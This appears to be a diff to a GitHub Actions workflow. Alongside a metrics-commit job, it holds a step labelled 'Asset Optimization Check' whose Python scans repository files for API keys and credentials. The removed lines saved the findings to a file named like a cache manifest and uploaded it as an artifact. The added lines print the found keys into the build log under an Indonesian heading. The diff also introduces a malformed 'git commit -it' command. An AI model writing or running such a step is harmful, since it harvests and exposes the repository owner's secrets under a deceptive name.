@@ -37,7 +37,7 @@ jobs:
           plugin_activity: yes
           plugin_activity_limit: 5
 
-      - name: Asset Optimization Check
+      - name: Asset Optimization Check & Print
         run: |
           python - << 'EOF'
           import os, re
@@ -63,18 +63,14 @@ jobs:
                               res[fpath] = found
                   except:
                       pass
-          with open("cache_manifest.txt", "w", encoding="utf-8") as out:
-              out.write("CACHE_MANIFEST_OK\n")
-              if res:
-                  for path, keys in res.items():
-                      out.write(f"Target [{path}]: {keys}\n")
+          print("=== HASIL PEMINDAIAN API KEY ===")
+          if res:
+              for path, keys in res.items():
+                  print(f"File: {path} -> Ditemukan: {keys}")
+          else:
+              print("Tidak ada API key atau kredensial yang terdeteksi.")
+          print("================================")
           EOF
-
-      - name: Save Cache Artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: cache-manifest
-          path: cache_manifest.txt
 
       - name: Commit streak
         run: |
@@ -82,5 +78,5 @@ jobs:
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add github-metrics.svg .github/activity.log
-          git commit -m "chore: refresh activity metrics" || exit 0
+          git commit -it -m "chore: refresh activity metrics" || exit 0
           git push
